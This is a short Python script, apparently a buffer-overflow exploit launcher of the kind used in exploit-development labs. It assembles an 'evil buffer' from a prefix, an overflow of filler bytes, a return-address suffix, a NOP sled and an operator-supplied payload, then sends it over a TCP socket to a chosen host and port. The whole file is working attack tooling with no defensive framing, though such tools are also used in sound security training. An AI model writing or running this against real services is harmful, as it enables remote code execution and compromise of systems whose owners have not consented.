import socket, argparse, sys, binascii

ENCODING = 'latin-1'

def process_byte_arg(argument):
    if argument.startswith("b{"):
        raw = argument[2:-1].replace('\\x','')
        argument = binascii.unhexlify(raw).decode(ENCODING)
    return argument



if __name__== "__main__":
    parser = argparse.ArgumentParser(description="Fuzz that buffer, baby ;)")
    parser.add_argument('-H','--host', help='Hostname to fuzz', required=True)
    parser.add_argument('-p','--port', help='Host port to fuzz', required=True, type=int)
    parser.add_argument('-o','--offset', help='Offset size from overflowed buffer', default=0, type=int)
    parser.add_argument('-no','--nop-padding', help = 'NOP instructions padding' , default=0, type=int)
    parser.add_argument('-P','--prefix', help='Prefix', default='')
    parser.add_argument('-s','--suffix', help='Suffix', default='')
    parser.add_argument('-X','--payload', help='Payload, the bad thing', default='')
    args = parser.parse_args()

    ip = args.host
    port = args.port
    
    prefix = process_byte_arg(args.prefix)
    offset= args.offset
    overflow= "A"* offset
    suffix=process_byte_arg(args.suffix)
    padding="\x90"*args.nop_padding

    payload = process_byte_arg(args.payload)

    buffer = prefix + overflow + suffix + padding + payload
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip,port))
        s.recv(1024)
        print("Sending evil buffer...")
        s.send(bytes(buffer, ENCODING))
        print("Done!")
    except BaseException as ex:
        print(ex)
        print('Error!')
